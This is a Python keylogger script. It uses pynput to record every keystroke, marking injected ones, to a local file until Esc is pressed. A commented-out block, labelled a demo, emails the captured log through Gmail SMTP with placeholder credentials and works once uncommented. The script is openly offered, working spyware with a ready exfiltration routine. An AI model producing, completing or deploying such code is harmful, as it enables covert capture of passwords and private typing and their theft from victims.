from pynput import keyboard
import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

filename = "keylog.txt"
with open(filename, "w") as file:
    file.write("Keylogging started\n")
def on_press(key, injected):
    try:
        with open(filename, "a") as file:
            file.write(f'{key.char} {(",faked " if injected else "")}\n')
    except AttributeError:
        with open(filename, "a") as file:
            file.write(f'{key} {(",faked" if injected else "")}\n')

def on_release(key, injected):
    if key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
        with open(filename, "a") as file:
            file.write(f'Shift released, {(",faked" if injected else "")}\n')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()

#Below is the code to send the log file via email.
# Uncomment and fill in the details to use.


# SENDER_EMAIL = "example.sender@gmail.com"
# RECIPIENT_EMAIL = "example.receiver@gmail.com"
# USERNAME = "example.sender@gmail.com"
# #typically an app password, as gmail 
# # now blocks less secure apps 
# PASSWORD = "yourpassword"

# msg = MIMEMultipart()
# msg['Subject'] = "Keylogger Report (Demo)"
# msg['From'] = SENDER_EMAIL
# msg['To'] = RECIPIENT_EMAIL

# with open(filename, "r") as file:
#     file_content = file.read()

# attachment = MIMEText(file_content, "plain")
# attachment.add_header(
#     "Content-Disposition",
#     "attachment", filename = filename
# )
# msg.attach(attachment)

# with smtplib.SMTP("smtp.gmail.com", 587) as server:
#     server.starttls()
#     server.login(USERNAME, PASSWORD)
#     server.send_message(msg)
# print("Email sent successfully.")